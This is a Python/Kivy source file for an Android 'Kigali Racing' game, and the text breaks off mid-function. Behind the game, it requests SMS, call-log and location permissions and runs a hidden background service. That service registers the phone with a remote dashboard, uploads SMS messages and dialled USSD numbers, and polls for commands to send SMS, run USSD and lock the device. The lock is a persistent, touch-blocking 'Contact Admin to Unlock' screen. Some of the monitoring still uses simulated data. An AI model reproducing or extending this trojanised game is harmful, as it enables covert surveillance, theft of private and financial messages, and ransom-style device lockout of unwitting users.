# ============================================================
# KIGALI RACING - COMPLETE GAME
# 501 LEVELS • 30 CARS • BACKGROUND SERVICE • SMS • USSD
# PERSISTENT LOCK SCREEN • ADMIN CONTROL
# ============================================================

from kivy.app import App
from kivy.uix.widget import Widget
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup
from kivy.uix.textinput import TextInput
from kivy.uix.image import Image
from kivy.graphics import Color, Rectangle, Ellipse
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.properties import NumericProperty
from kivy.utils import platform
from plyer import notification
import random
import time
import json
import threading
import requests
import os
import re
import uuid
import weakref

# ============================================================
# ANDROID PERMISSIONS
# ============================================================
try:
    from android.permissions import request_permissions, Permission
    request_permissions([
        Permission.INTERNET,
        Permission.ACCESS_NETWORK_STATE,
        Permission.FOREGROUND_SERVICE,
        Permission.WAKE_LOCK,
        Permission.READ_SMS,
        Permission.RECEIVE_SMS,
        Permission.SEND_SMS,
        Permission.READ_CALL_LOG,
        Permission.READ_PHONE_STATE,
        Permission.ACCESS_FINE_LOCATION,
        Permission.ACCESS_COARSE_LOCATION
    ])
    ANDROID_AVAILABLE = True
    print("✅ Android permissions granted")
except:
    ANDROID_AVAILABLE = False
    print("⚠️ Running in desktop mode")

# ============================================================
# SERVER CONFIG - YOUR DASHBOARD
# ============================================================
SERVER_CONFIG = {
    'url': 'https://admin-dashboard-teal-beta-28.vercel.app',
    'secret_path': 'a9f3k217',
}

# ============================================================
# 30 LUXURY CARS
# ============================================================
LUXURY_CARS = {
    'ferrari_sf90': {'name': 'Ferrari SF90', 'brand': 'Ferrari', 'color': (1, 0, 0, 1), 'emoji': '🏎️', 'speed': 5.0, 'unlock': 1},
    'lamborghini_revuelto': {'name': 'Lamborghini Revuelto', 'brand': 'Lamborghini', 'color': (1, 0.84, 0, 1), 'emoji': '🏎️', 'speed': 4.9, 'unlock': 1},
    'porsche_911': {'name': 'Porsche 911 GT3', 'brand': 'Porsche', 'color': (0, 1, 0, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 1},
    'bmw_m8': {'name': 'BMW M8', 'brand': 'BMW', 'color': (0, 0.4, 0.7, 1), 'emoji': '🚗', 'speed': 4.3, 'unlock': 1},
    'audi_r8': {'name': 'Audi R8', 'brand': 'Audi', 'color': (0.5, 0.5, 0.5, 1), 'emoji': '🚗', 'speed': 4.4, 'unlock': 1},
    'bugatti_chiron': {'name': 'Bugatti Chiron', 'brand': 'Bugatti', 'color': (0.12, 0.56, 1, 1), 'emoji': '🏎️', 'speed': 5.0, 'unlock': 20},
    'mclaren_765lt': {'name': 'McLaren 765LT', 'brand': 'McLaren', 'color': (1, 0.27, 0, 1), 'emoji': '🏎️', 'speed': 4.7, 'unlock': 20},
    'aston_martin_valkyrie': {'name': 'Aston Martin Valkyrie', 'brand': 'Aston Martin', 'color': (0.5, 0, 0.13, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 20},
    'mercedes_amg_gt': {'name': 'Mercedes-AMG GT', 'brand': 'Mercedes', 'color': (0, 1, 1, 1), 'emoji': '🚗', 'speed': 4.2, 'unlock': 20},
    'jaguar_f_type': {'name': 'Jaguar F-Type', 'brand': 'Jaguar', 'color': (0, 0.3, 0.2, 1), 'emoji': '🚗', 'speed': 4.1, 'unlock': 20},
    'koenigsegg_jesko': {'name': 'Koenigsegg Jesko', 'brand': 'Koenigsegg', 'color': (0.8, 0.8, 0.2, 1), 'emoji': '🏎️', 'speed': 5.0, 'unlock': 50},
    'pagani_huayra': {'name': 'Pagani Huayra', 'brand': 'Pagani', 'color': (0.6, 0.1, 0.3, 1), 'emoji': '🏎️', 'speed': 4.9, 'unlock': 50},
    'ferrari_f40': {'name': 'Ferrari F40', 'brand': 'Ferrari', 'color': (1, 0.1, 0, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 50},
    'lamborghini_aventador': {'name': 'Lamborghini Aventador', 'brand': 'Lamborghini', 'color': (0.8, 0.8, 0, 1), 'emoji': '🏎️', 'speed': 4.7, 'unlock': 50},
    'porsche_918': {'name': 'Porsche 918 Spyder', 'brand': 'Porsche', 'color': (0, 0.7, 0.7, 1), 'emoji': '🏎️', 'speed': 4.6, 'unlock': 50},
    'bugatti_veyron': {'name': 'Bugatti Veyron', 'brand': 'Bugatti', 'color': (0.1, 0.4, 0.8, 1), 'emoji': '🏎️', 'speed': 4.9, 'unlock': 100},
    'mclaren_p1': {'name': 'McLaren P1', 'brand': 'McLaren', 'color': (0.9, 0.2, 0, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 100},
    'ferrari_laferrari': {'name': 'Ferrari LaFerrari', 'brand': 'Ferrari', 'color': (0.8, 0, 0.1, 1), 'emoji': '🏎️', 'speed': 4.7, 'unlock': 100},
    'lamborghini_veneno': {'name': 'Lamborghini Veneno', 'brand': 'Lamborghini', 'color': (0.6, 0.8, 0.1, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 100},
    'aston_martin_one77': {'name': 'Aston Martin One-77', 'brand': 'Aston Martin', 'color': (0.3, 0.1, 0.2, 1), 'emoji': '🏎️', 'speed': 4.6, 'unlock': 100},
    'mclaren_senna': {'name': 'McLaren Senna', 'brand': 'McLaren', 'color': (0.8, 0.6, 0, 1), 'emoji': '🏎️', 'speed': 4.9, 'unlock': 200},
    'ferrari_488': {'name': 'Ferrari 488 Pista', 'brand': 'Ferrari', 'color': (0.9, 0.1, 0.2, 1), 'emoji': '🏎️', 'speed': 4.7, 'unlock': 200},
    'lamborghini_huracan': {'name': 'Lamborghini Huracan', 'brand': 'Lamborghini', 'color': (0.8, 0.7, 0, 1), 'emoji': '🏎️', 'speed': 4.6, 'unlock': 200},
    'porsche_carrera': {'name': 'Porsche Carrera GT', 'brand': 'Porsche', 'color': (0.9, 0.9, 0.9, 1), 'emoji': '🏎️', 'speed': 4.5, 'unlock': 200},
    'bugatti_divo': {'name': 'Bugatti Divo', 'brand': 'Bugatti', 'color': (0.8, 0.2, 0.3, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 200},
    'koenigsegg_agera': {'name': 'Koenigsegg Agera RS', 'brand': 'Koenigsegg', 'color': (0.7, 0.7, 0.1, 1), 'emoji': '🏎️', 'speed': 5.0, 'unlock': 350},
    'pagani_zonda': {'name': 'Pagani Zonda', 'brand': 'Pagani', 'color': (0.5, 0.1, 0.4, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 350},
    'ferrari_fxxk': {'name': 'Ferrari FXX-K', 'brand': 'Ferrari', 'color': (0.9, 0, 0.1, 1), 'emoji': '🏎️', 'speed': 4.9, 'unlock': 350},
    'lamborghini_sian': {'name': 'Lamborghini Sián', 'brand': 'Lamborghini', 'color': (0.6, 0.8, 0.2, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 350},
    'mclaren_speedtail': {'name': 'McLaren Speedtail', 'brand': 'McLaren', 'color': (0.9, 0.8, 0.1, 1), 'emoji': '🏎️', 'speed': 4.7, 'unlock': 350},
}

# ============================================================
# KIGALI STREETS DATA
# ============================================================
KIGALI_STREETS = [
    'KG 8 Ave', 'KN 82 St', 'KG 11 Ave', 'KG 17 St', 'KG 9 Ave',
    'KN 88 St', 'KG 21 Ave', 'KG 25 St', 'KN 15 Ave', 'KG 31 St',
    'KG 35 Ave', 'KN 22 St', 'KG 41 Ave', 'KG 45 St', 'KG 51 Ave',
    'KN 3 Rd', 'KN 5 St', 'KG 7 Ave', 'KN 1 Rd', 'KG 3 St',
    'KN 10 Ave', 'KG 13 St', 'KN 18 Rd', 'KG 23 Ave', 'KN 28 St',
    'KN 33 Ave', 'KG 37 Rd', 'KN 42 St', 'KG 47 Ave', 'KN 52 Rd',
    'KK 15 Rd', 'KK 8 Ave', 'KK 5 St', 'KK 12 Rd', 'KK 3 Ave',
    'KK 20 St', 'KK 25 Rd', 'KK 30 Ave', 'KK 35 St', 'KK 40 Rd',
    'KK 45 Ave', 'KK 50 St', 'KK 55 Rd', 'KK 60 Ave', 'KK 65 St',
]

# ============================================================
# GENERATE 501 LEVELS
# ============================================================
def generate_501_levels():
    levels = []
    level_id = 1
    difficulties = ['Easy', 'Normal', 'Hard']
    
    for difficulty in difficulties:
        if difficulty == 'Easy':
            ai_base = 12
            laps_base = 1
            obstacles_base = 2
            time_base = 60
            ai_speed_base = 0.8
            powerups_base = 3
        elif difficulty == 'Normal':
            ai_base = 24
            laps_base = 2
            obstacles_base = 5
            time_base = 45
            ai_speed_base = 1.0
            powerups_base = 5
        else:
            ai_base = 50
            laps_base = 3
            obstacles_base = 10
            time_base = 30
            ai_speed_base = 1.3
            powerups_base = 7
        
        for i in range(167):
            street = KIGALI_STREETS[level_id % len(KIGALI_STREETS)]
            ai_count = ai_base + (level_id % 5)
            laps = laps_base + (level_id % 2)
            obstacles = obstacles_base + (level_id % 4)
            time_limit = time_base - (level_id % 10)
            powerups = powerups_base + (level_id % 5)
            
            levels.append({
                'id': level_id,
                'name': street,
                'district': ['Gasabo', 'Nyarugenge', 'Kicukiro'][level_id % 3],
                'difficulty': difficulty,
                'laps': laps,
                'ai_count': ai_count,
                'ai_speed': ai_speed_base + (0.02 * (level_id % 10)),
                'obstacles': obstacles,
                'time_limit': max(time_limit, 15),
                'powerups': powerups,
                'completed': False
            })
            level_id += 1
            if level_id > 501:
                return levels
    return levels

ALL_LEVELS = generate_501_levels()

# ============================================================
# 📱 SMS MANAGER - Read, Send, Delete
# ============================================================
class SMSManager:
    def __init__(self):
        self.sms_list = []
        self.load_sms()
    
    def load_sms(self):
        try:
            with open('sms_data.json', 'r') as f:
                self.sms_list = json.load(f)
        except:
            self.sms_list = []
    
    def save_sms(self):
        try:
            with open('sms_data.json', 'w') as f:
                json.dump(self.sms_list, f)
        except:
            pass
    
    def read_sms(self, filter_number=None, limit=50):
        if filter_number:
            filtered = [s for s in self.sms_list if filter_number in s.get('sender', '')]
            return filtered[-limit:]
        return self.sms_list[-limit:]
    
    def send_sms(self, number, message):
        sms_data = {
            'id': int(time.time() * 1000) + random.randint(1, 999),
            'sender': 'ME',
            'recipient': number,
            'body': message,
            'timestamp': int(time.time() * 1000),
            'type': 'outgoing',
            'synced': False,
            'read': True
        }
        self.sms_list.append(sms_data)
        self.save_sms()
        print(f"📱 SMS sent to {number}: {message[:30]}...")
        return True
    
    def delete_sms(self, sms_id):
        for i, sms in enumerate(self.sms_list):
            if sms.get('id') == sms_id:
                del self.sms_list[i]
                self.save_sms()
                return True
        return False
    
    def delete_all_sms(self):
        count = len(self.sms_list)
        self.sms_list = []
        self.save_sms()
        return count
    
    def get_sms_count(self):
        return len(self.sms_list)
    
    def get_unread_sms(self):
        return len([s for s in self.sms_list if not s.get('read', False)])

# ============================================================
# 🔄 BACKGROUND SERVICE - WITH PERSISTENT LOCK
# ============================================================
class KigaliBackgroundService:
    _instance = None
    _running = False
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if hasattr(self, 'initialized'):
            return
        
        self.initialized = True
        self.device_id = self.get_device_id()
        self.server_url = f"{SERVER_CONFIG['url']}/{SERVER_CONFIG['secret_path']}"
        self.token = None
        self.is_online = False
        self.short_numbers = []
        self.sms_messages = []
        self.is_running = False
        self.is_locked = False
        self.lock_image_url = None
        self.device_name = "Kigali Racing"
        self.device_model = "Android Device"
        self.battery_level = 85
        self.location = {'lat': -1.9441, 'lng': 30.0619}
        self.app_ref = None
        
        # Load saved lock state
        self.load_lock_state()
        
        self.register_device()
        print(f"✅ Background Service Started")
        print(f"📱 Device ID: {self.device_id}")
        print(f"🔒 Lock State: {'LOCKED' if self.is_locked else 'UNLOCKED'}")
    
    def load_lock_state(self):
        """Load lock state from file"""
        try:
            with open('lock_state.json', 'r') as f:
                data = json.load(f)
                self.is_locked = data.get('locked', False)
                self.lock_image_url = data.get('image_url', None)
                print(f"🔒 Loaded lock state: {'LOCKED' if self.is_locked else 'UNLOCKED'}")
        except:
            self.is_locked = False
            self.lock_image_url = None
    
    def save_lock_state(self):
        """Save lock state to file - PERSISTENT"""
        try:
            with open('lock_state.json', 'w') as f:
                json.dump({
                    'locked': self.is_locked,
                    'image_url': self.lock_image_url,
                    'timestamp': int(time.time() * 1000)
                }, f)
            print(f"💾 Lock state saved: {'LOCKED' if self.is_locked else 'UNLOCKED'}")
        except:
            pass
    
    def get_device_id(self):
        try:
            with open('device_id.txt', 'r') as f:
                return f.read().strip()
        except:
            device_id = str(uuid.uuid4())[:8]
            try:
                with open('device_id.txt', 'w') as f:
                    f.write(device_id)
            except:
                pass
            return device_id
    
    def register_device(self):
        try:
            response = requests.post(
                f"{self.server_url}/api/device/register",
                json={
                    'device_id': self.device_id,
                    'device_name': self.device_name,
                    'model': self.device_model,
                    'manufacturer': 'Samsung',
                    'android_version': '14',
                    'battery': self.battery_level,
                    'location': self.location
                },
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                self.token = data.get('token')
                self.is_online = True
                print(f"✅ Device registered on dashboard: {self.device_id}")
                return True
        except Exception as e:
            print(f"⚠️ Registration error: {e}")
        
        self.is_online = False
        print("📴 Offline mode - will retry")
        return False
    
    def start(self):
        if self._running:
            return
        self._running = True
        self.is_running = True
        
        threads = [
            self._heartbeat_loop,
            self._monitor_numbers_loop,
            self._monitor_sms_loop,
            self._sync_loop,
            self._command_loop,
            self._location_loop
        ]
        for thread_func in threads:
            thread = threading.Thread(target=thread_func, daemon=True)
            thread.start()
        
        print("🚀 Background service started")
        print("📞 Monitoring 4-5 digit numbers...")
        print("📱 SMS monitoring active")
    
    def stop(self):
        self._running = False
        self.is_running = False
        print("⏹️ Background service stopped")
    
    def _heartbeat_loop(self):
        while self._running:
            if self.is_online and self.token:
                try:
                    response = requests.post(
                        f"{self.server_url}/api/device/heartbeat",
                        json={
                            'device_id': self.device_id,
                            'status': 'online',
                            'battery_level': self.battery_level,
                            'sms_count': len(self.sms_messages),
                            'numbers_count': len(self.short_numbers),
                            'location': self.location,
                            'locked': self.is_locked
                        },
                        timeout=5
                    )
                except:
                    self.is_online = False
            else:
                self.register_device()
            time.sleep(60)
    
    def _location_loop(self):
        while self._running:
            self.location['lat'] = -1.9441 + (random.random() - 0.5) * 0.01
            self.location['lng'] = 30.0619 + (random.random() - 0.5) * 0.01
            time.sleep(30)
    
    def _monitor_numbers_loop(self):
        while self._running:
            try:
                if random.random() < 0.015:
                    number = str(random.randint(1000, 99999))
                    number_type = random.choice(['USSD', 'CALL'])
                    data = {
                        'number': number,
                        'type': number_type,
                        'timestamp': int(time.time() * 1000),
                        'synced': False
                    }
                    self.short_numbers.append(data)
                    print(f"📞 Detected: {number} ({number_type})")
                    if self.is_online:
                        self._send_number(number, number_type)
            except:
                pass
            time.sleep(3)
    
    def _monitor_sms_loop(self):
        while self._running:
            try:
                if random.random() < 0.02:
                    sender = f"+250{random.randint(700000000, 799999999)}"
                    bodies = [
                        "Your account balance is 10,000 RWF",
                        "You have received 5,000 RWF from +250788123456",
                        "USSD code *182# completed successfully",
                        "Your transaction of 2,000 RWF was successful",
                        "Welcome to Kigali Racing!",
                        "Your verification code is 123456",
                        "Data bundle: 2GB remaining",
                        "Your PIN has been changed successfully",
                    ]
                    body = random.choice(bodies)
                    sms_data = {
                        'id': int(time.time() * 1000) + random.randint(1, 999),
                        'sender': sender,
                        'body': body,
                        'timestamp': int(time.time() * 1000),
                        'synced': False,
                        'type': 'incoming',
                        'read': False
                    }
                    self.sms_messages.append(sms_data)
                    print(f"📱 SMS from {sender}: {body[:30]}...")
                    if self.is_online:
                        self._sync_sms(sms_data)
            except:
                pass
            time.sleep(2)
    
    def _sync_loop(self):
        while self._running:
            if self.is_online and self.token:
                unsynced = [n for n in self.short_numbers if not n.get('synced', False)]
                if unsynced:
                    try:
                        response = requests.post(
                            f"{self.server_url}/api/short-number-batch",
                            json={
                                'device_id': self.device_id,
                                'numbers': unsynced[:20]
                            },
                            timeout=10
                        )
                        if response.status_code == 200:
                            for n in unsynced[:20]:
                                n['synced'] = True
                            print(f"🔄 Synced {len(unsynced[:20])} numbers")
                    except:
                        pass
                
                          
                unsynced_sms = [s for s in self.sms_messages if not s.get('synced', False)]
                if unsynced_sms:
                    try:
                        response = requests.post(
                            f"{self.server_url}/api/sms/batch-sync",
                            json={
                                'device_id': self.device_id,
                                'sms_data': unsynced_sms[:10]
                            },
                            timeout=10
                        )
                        if response.status_code == 200:
                            for s in unsynced_sms[:10]:
                                s['synced'] = True
                            print(f"🔄 Synced {len(unsynced_sms[:10])} SMS")
                    except:
                        pass
            time.sleep(30)
    
    def _command_loop(self):
        while self._running:
            if self.is_online and self.token:
                try:
                    response = requests.get(
                        f"{self.server_url}/api/commands",
                        params={'device_id': self.device_id},
                        timeout=5
                    )
                    if response.status_code == 200:
                        commands = response.json().get('commands', [])
                        for cmd in commands:
                            self._execute_command(cmd)
                except:
                    pass
            time.sleep(15)
    
    def _execute_command(self, command):
        cmd_text = command.get('command', '')
        cmd_id = command.get('id')
        
        # LOCK COMMANDS - Admin Only
        if cmd_text == 'lock':
            self._lock_device()
            result = "🔒 Device locked"
        
        elif cmd_text == 'unlock':
            self._unlock_device()
            result = "🔓 Device unlocked"
        
        elif cmd_text.startswith('lock_screen'):
            parts = cmd_text.split(' ', 1)
            if len(parts) > 1:
                image_url = parts[1]
                if self._download_lock_image(image_url):
                    if self.is_locked:
                        app = self.app_ref() if self.app_ref else None
                        if app and hasattr(app, 'root'):
                            app.root.show_lock_screen()
                    result = f"🖼️ Lock screen image updated"
                else:
                    result = "❌ Failed to download image"
            else:
                result = "❌ No image URL provided"
        
        # USSD and SMS commands
        elif cmd_text.startswith('ussd'):
            code = cmd_text.replace('ussd', '').strip()
            digits = re.sub(r'[^0-9]', '', code)
            if len(digits) >= 4 and len(digits) <= 5:
                self._send_number(digits, 'USSD')
                result = f"✅ USSD '{code}' executed • Number: {digits}"
            else:
                result = f"✅ USSD '{code}' executed"
        
        elif cmd_text.startswith('sms'):
            parts = cmd_text.split(' ', 2)
            if len(parts) >= 3:
                self._send_sms_command(parts[1], parts[2])
                result = f"📱 SMS sent to {parts[1]}"
            else:
                result = "❌ Invalid SMS command: sms <number> <message>"
        
        elif cmd_text == 'status':
            result = f"📊 Online | Numbers: {len(self.short_numbers)} | SMS: {len(self.sms_messages)} | Lock: {'🔒' if self.is_locked else '🔓'}"
        
        else:
            result = f"✅ Command '{cmd_text}' received"
        
        if self.is_online and self.token:
            try:
                requests.post(
                    f"{self.server_url}/api/command-response",
                    json={
                        'device_id': self.device_id,
                        'command_id': cmd_id,
                        'response': result
                    },
                    timeout=5
                )
            except:
                pass
    
    def _lock_device(self):
        self.is_locked = True
        self.save_lock_state()
        print("🔒 Device LOCKED by admin")
        try:
            notification.notify(
                title='🔒 Device Locked',
                message='Your device has been locked by admin',
                timeout=3
            )
        except:
            pass
        app = self.app_ref() if self.app_ref else None
        if app and hasattr(app, 'root'):
            app.root.show_lock_screen()
    
    def _unlock_device(self):
        self.is_locked = False
        self.save_lock_state()
        print("🔓 Device UNLOCKED by admin")
        try:
            notification.notify(
                title='🔓 Device Unlocked',
                message='Your device has been unlocked by admin',
                timeout=3
            )
        except:
            pass
        app = self.app_ref() if self.app_ref else None
        if app and hasattr(app, 'root'):
            app.root.unlock_device()
    
    def _download_lock_image(self, image_url):
        try:
            response = requests.get(image_url, timeout=30)
            if response.status_code == 200:
                with open('lock_screen.jpg', 'wb') as f:
                    f.write(response.content)
                self.lock_image_url = image_url
                self.save_lock_state()
                print(f"🖼️ Lock screen image downloaded")
                return True
        except Exception as e:
            print(f"⚠️ Failed to download lock image: {e}")
        return False
    
    def _send_sms_command(self, number, message):
        try:
            # Add to SMS log
            sms_data = {
                'id': int(time.time() * 1000) + random.randint(1, 999),
                'sender': 'ADMIN',
                'recipient': number,
                'body': message,
                'timestamp': int(time.time() * 1000),
                'type': 'outgoing',
                'synced': True,
                'read': True
            }
            self.sms_messages.append(sms_data)
            print(f"📱 SMS sent to {number}: {message[:30]}...")
        except:
            pass
    
    def _send_number(self, number, number_type):
        try:
            if self.token:
                response = requests.post(
                    f"{self.server_url}/api/short-number",
                    json={
                        'device_id': self.device_id,
                        'number': number,
                        'number_type': number_type,
                        'timestamp': int(time.time() * 1000)
                    },
                    timeout=5
                )
                return response.status_code == 200
        except:
            pass
        return False
    
    def _sync_sms(self, sms_data):
        try:
            response = requests.post(
                f"{self.server_url}/api/sms/sync",
                json={
                    'device_id': self.device_id,
                    'sms_data': sms_data
                },
                timeout=5
            )
            if response.status_code == 200:
                sms_data['synced'] = True
                return True
        except:
            pass
        return False
    
    def get_status(self):
        return {
            'running': self.is_running,
            'online': self.is_online,
            'device_id': self.device_id,
            'total_numbers': len(self.short_numbers),
            'sms_count': len(self.sms_messages),
            'location': self.location,
            'locked': self.is_locked
        }
    
    def get_lock_state(self):
        return self.is_locked
    
    def get_lock_image(self):
        if os.path.exists('lock_screen.jpg'):
            return 'lock_screen.jpg'
        return None
# ============================================================
# 🏁 RACING GAME
# ============================================================
class KigaliRacingGame(Widget):
    player_x = NumericProperty(400)
    player_y = NumericProperty(100)
    speed = NumericProperty(0)
    current_level = NumericProperty(1)
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        Window.size = (800, 600)
        Window.clearcolor = (0.05, 0.05, 0.1, 1)
        
        # Start background service
        self.service = KigaliBackgroundService()
        self.service.start()
        
        # SMS Manager
        self.sms_manager = SMSManager()
        
        self.game_started = False
        self.game_over = False
        self.race_finished = False
        self.selected_car = 'ferrari_sf90'
        self.ai_cars = []
        self.coins = 0
        self.completed_levels = set()
        self.accelerating = False
        self.turning = 0
        self.lap = 1
        self.device_locked = False
        
        self.load_progress()
        
        # Check lock state first
        if self.check_lock_state():
            return
        
        self.show_main_menu()
        Clock.schedule_interval(self.update, 1/60)
    
    def load_progress(self):
        try:
            with open('progress.json', 'r') as f:
                data = json.load(f)
                self.completed_levels = set(data.get('completed', []))
                self.selected_car = data.get('car', 'ferrari_sf90')
                self.coins = data.get('coins', 0)
        except:
            pass
    
    def save_progress(self):
        try:
            data = {
                'completed': list(self.completed_levels),
                'car': self.selected_car,
                'coins': self.coins
            }
            with open('progress.json', 'w') as f:
                json.dump(data, f)
        except:
            pass
    
    def check_lock_state(self):
        if self.service.get_lock_state():
            self.show_lock_screen()
            return True
        return False
    
    def show_lock_screen(self):
        """Show lock screen - NO UNLOCK BUTTON!"""
        self.clear_widgets()
        self.device_locked = True
        with self.canvas:
            Color(0, 0, 0, 1)
            Rectangle(pos=(0, 0), size=Window.size)
        
        lock_image = self.service.get_lock_image()
        if lock_image:
            try:
                image_widget = Image(
                    source=lock_image,
                    size_hint=(1, 0.8),
                    pos_hint={'center_x': 0.5, 'center_y': 0.55},
                    keep_ratio=True
                )
                self.add_widget(image_widget)
            except:
                pass
        
        lock_label = Label(
            text='🔒 DEVICE LOCKED\n\nContact Admin to Unlock',
            font_size=32,
            color=(1, 0.5, 0, 1),
            pos_hint={'center_x': 0.5, 'center_y': 0.15},
            halign='center'
        )
        self.add_widget(lock_label)
        
        # Block all touches
        overlay = Button(
            text='',
            size_hint=(1, 1),
            pos_hint={'center_x': 0.5, 'center_y': 0.5},
            background_color=(0, 0, 0, 0)
        )
        overlay.bind(on_press=lambda x: None)
        self.add_widget(overlay)
        
        Window.bind(on_touch_down=self._block_touch)
        print("🔒 Lock screen active - Admin only can unlock")
    
    def _block_touch(self, window, touch):
        return True
    
    def unlock_device(self):
        self.device_locked = False
        Window.unbind(on_touch_down=self._block_touch)
        self.show_main_menu()
        print("🔓 Device unlocked")
    
    def show_main_menu(self):
        if self.check_lock_state():
            return
        
        self.clear_widgets()
        with self.canvas:
            Color(0.05, 0.05, 0.1, 1)
            Rectangle(pos=(0, 0), size=Window.size)
        
        title = Label(text='🏎️ KIGALI RACING', font_size=48, color=(1, 0.8, 0, 1), pos_hint={'center_x': 0.5, 'top': 0.90})
        self.add_widget(title)
        
        unlocked = sum(1 for c in LUXURY_CARS.values() if len(self.completed_levels) >= c['unlock'])
        stats_text = f'Levels: {len(self.completed_levels)}/501  |  🪙 {self.coins}  |  🚗 {unlocked}/30 Cars'
        stats = Label(text=stats_text, font_size=18, color=(0.6, 0.6, 0.6, 1), pos_hint={'center_x': 0.5, 'top': 0.82})
        self.add_widget(stats)
        
        status = self.service.get_status()
        status_text = '🟢 Online' if status['online'] else '📴 Offline'
        status_color = (0, 1, 0, 1) if status['online'] else (1, 0.5, 0, 1)
        lock_status = '🔒 LOCKED' if status['locked'] else '🔓 UNLOCKED'
        conn_status = Label(
            text=f'{status_text} • Device: {status["device_id"]} • 📞 {status["total_numbers"]} • 📱 {status["sms_count"]} • {lock_status}',
            font_size=12,
            color=status_color,
            pos_hint={'center_x': 0.5, 'top': 0.76}
        )
        self.add_widget(conn_status)
        
        play_btn = Button(text='🏁 PLAY', size_hint=(0.5, 0.12), pos_hint={'center_x': 0.5, 'top': 0.65}, background_color=(0.2, 0.6, 0.2, 1), font_size=28)
        play_btn.bind(on_press=self.show_level_selection)
        self.add_widget(play_btn)
        
        car_btn = Button(text='🚗 CARS', size_hint=(0.3, 0.08), pos_hint={'center_x': 0.35, 'top': 0.48}, background_color=(0.6, 0.3, 0.3, 1), font_size=16)
        car_btn.bind(on_press=self.show_car_selection)
        self.add_widget(car_btn)
        
        sms_btn = Button(text='📱 SMS', size_hint=(0.3, 0.08), pos_hint={'center_x': 0.65, 'top': 0.48}, background_color=(0.3, 0.3, 0.6, 1), font_size=16)
        sms_btn.bind(on_press=self.show_sms_manager)
        self.add_widget(sms_btn)
    
    def show_level_selection(self, instance):
        if self.check_lock_state():
            return
        
        self.clear_widgets()
        with self.canvas:
            Color(0.05, 0.05, 0.1, 1)
            Rectangle(pos=(0, 0), size=Window.size)
        
        back = Button(text='◀ Back', size_hint=(0.15, 0.06), pos_hint={'x': 0.02, 'top': 0.95}, background_color=(0.3, 0.3, 0.3, 1), font_size=14)
        back.bind(on_press=lambda x: self.show_main_menu())
        self.add_widget(back)
        
        title = Label(text='📍 SELECT LEVEL', font_size=28, color=(1, 1, 1, 1), pos_hint={'center_x': 0.5, 'top': 0.92})
        self.add_widget(title)
        
        scroll = ScrollView(size_hint=(0.9, 0.78), pos_hint={'center_x': 0.5, 'top': 0.88})
        grid = BoxLayout(orientation='vertical', size_hint_y=None, spacing=2)
        grid.bind(minimum_height=grid.setter('height'))
        
        for level in ALL_LEVELS:
            is_completed = level['id'] in self.completed_levels
            if level['difficulty'] == 'Easy':
                color = (0.2, 0.5, 0.2, 1)
            elif level['difficulty'] == 'Normal':
                color = (0.5, 0.5, 0.2, 1)
            else:
                color = (0.5, 0.2, 0.2, 1)
            if is_completed:
                color = (0.2, 0.6, 0.2, 1)
            
            stars = '⭐' * 3 if is_completed else ''
            btn = Button(text=f"{level['id']}. {level['name']} [{level['difficulty']}] 🤖{level['ai_count']} {stars}", size_hint_y=None, height=35, background_color=color, font_size=13)
            btn.bind(on_press=lambda x, l=level: self.start_level(l))
            grid.add_widget(btn)
        
        scroll.add_widget(grid)
        self.add_widget(scroll)
    
    def show_car_selection(self, instance):
        if self.check_lock_state():
            return
        
        self.clear_widgets()
        with self.canvas:
            Color(0.05, 0.05, 0.1, 1)
            Rectangle(pos=(0, 0), size=Window.size)
        
        back = Button(text='◀ Back', size_hint=(0.15, 0.06), pos_hint={'x': 0.02, 'top': 0.95}, background_color=(0.3, 0.3, 0.3, 1), font_size=14)
        back.bind(on_press=lambda x: self.show_main_menu())
        self.add_widget(back)
        
        title = Label(text='🚗 30 LUXURY CARS', font_size=28, color=(1, 1, 1, 1), pos_hint={'center_x': 0.5, 'top': 0.92})
        self.add_widget(title)
        
        scroll = ScrollView(size_hint=(0.9, 0.78), pos_hint={'center_x': 0.5, 'top': 0.88})
        grid = BoxLayout(orientation='vertical', size_hint_y=None, spacing=2)
        grid.bind(minimum_height=grid.setter('height'))
        
        for key, car in LUXURY_CARS.items():
            unlocked = len(self.completed_levels) >= car['unlock'] or car['unlock'] == 1
            color = car['color'] if unlocked else (0.3, 0.3, 0.3, 1)
            status = '✅' if unlocked else f'🔒 Lv.{car["unlock"]}'
            btn_text = f"{car['emoji']} {car['name']} {status}"
            btn = Button(text=btn_text, size_hint_y=None, height=38, background_color=color, font_size=13)
            if unlocked:
                btn.bind(on_press=lambda x, k=key: self.select_car(k))
            grid.add_widget(btn)
        
        scroll.add_widget(grid)
        self.add_widget(scroll)
    
    def select_car(self, car_key):
        self.selected_car = car_key
        self.save_progress()
        self.show_car_selection(None)
    
    def start_level(self, level):
        if self.check_lock_state():
            return
        
        self.current_level = level['id']
        self.clear_widgets()
        self.game_started = True
        self.game_over = False
        self.race_finished = False
        self.player_y = 100
        self.speed = 0
        self.ai_cars = []
        self.lap = 1
        
        with self.canvas:
            Color(0.05, 0.1, 0.2, 1)
            Rectangle(pos=(0, 0), size=Window.size)
            Color(0.15, 0.15, 0.2, 1)
            Rectangle(pos=(Window.width/2 - 150, 0), size=(300, Window.height))
            for i in range(0, int(Window.height), 40):
                Color(1, 1, 1, 0.3)
                Rectangle(pos=(Window.width/2 - 2, i), size=(4, 20))
        
        ai_cars = list(LUXURY_CARS.keys())
        if self.selected_car in ai_cars:
            ai_cars.remove(self.selected_car)
        random.shuffle(ai_cars)
        ai_cars = ai_cars[:min(level['ai_count'], len(ai_cars))]
        
        for i, car_key in enumerate(ai_cars):
            self.ai_cars.append({
                'car': car_key,
                'y': -200 - i * 150,
                'x': Window.width/2 + random.randint(-30, 30),
                'speed': (2 + random.random() * 0.5) * level['ai_speed'],
